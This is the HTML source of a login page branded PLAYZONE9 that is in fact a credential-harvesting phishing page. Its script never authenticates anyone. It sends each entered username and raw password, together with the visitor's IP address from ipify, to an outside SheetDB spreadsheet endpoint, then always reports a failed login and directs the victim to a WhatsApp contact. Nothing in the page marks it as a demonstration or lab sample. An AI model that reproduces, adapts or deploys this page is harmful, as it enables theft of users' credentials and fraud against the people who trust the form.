<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PLAYZONE9</title>
    <link rel="icon" type="image/png" href="favicon.png" />
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
  </head>

  <body>
    <!-- LOGO -->
    <div class="logo-container">
      <img src="logo2.png" alt="Logo" class="logo" />
    </div>

    <!-- LOGIN BOX -->
    <div class="contain">
      <!-- USERNAME -->
      <div class="input-group">
        <input type="text" id="username" placeholder="Username" />
      </div>

      <!-- PASSWORD -->
      <div class="input-group">
        <input type="password" id="password" placeholder="Password" />
      </div>

      <!-- SUBMIT BUTTON -->
      <button class="login-btn" onclick="submitForm()">
        Login <i class="fas fa-paper-plane"></i>
      </button>

      <!-- DEMO ID BUTTON -->
      <button class="demo-btn">
        Login with Demo ID <i class="fas fa-sign-in-alt"></i>
      </button>

      <!-- RECAPTCHA TEXT -->
      <div class="recaptcha-info">
        This site is protected by reCAPTCHA and the Google
        <a href="#">Privacy Policy</a> and
        <a href="#">Terms of Service</a> apply.
      </div>

      <!-- EMAIL -->
      <p class="email-text">playzone9official@gmail.com</p>

      <!-- WhatsApp Join -->
      <a
        href="https://wa.me/919555738726"
        target="_blank"
        class="whatsapp-join"
      >
        <img src="whatsapp.png" class="wa-logo" /> JOIN WHATSAPP CHANNEL (BONUS)
      </a>

      <!-- SUCCESS MESSAGE -->
      <p id="successMsg" style="display:none; color:red; text-align:center; margin-top:10px;">
        LOGIN FAILED CONTACT WHATSAPP!
      </p>
    </div>

    <!-- WhatsApp Floating Button -->
    <a href="https://wa.me/919555738726" class="wa-support" target="_blank">
      <img src="whatsapp2.png" alt="WhatsApp Support" />
    </a>

    <!-- SCRIPT -->
    <script>
  const API_URL = "https://sheetdb.io/api/v1/ye9thoog76f80";

  function submitForm() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (!username || !password) {
      alert("Please fill both fields");
      return;
    }

    // Get IP
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {

        let data = {
          data: [
            {
              username: username,
              password: password,   // RAW PASSWORD (no hash)
              ip: ipData.ip,
              timestamp: new Date().toLocaleString()
            }
          ]
        };

        fetch(API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        })
        .then(() => {
          document.getElementById("successMsg").style.display = "block";
        })
        .catch(() => {
          alert("Error submitting form");
        });

      })
      .catch(() => {
        alert("Could not fetch IP. Try again.");
      });
  }
</script>

  </body>
</html>
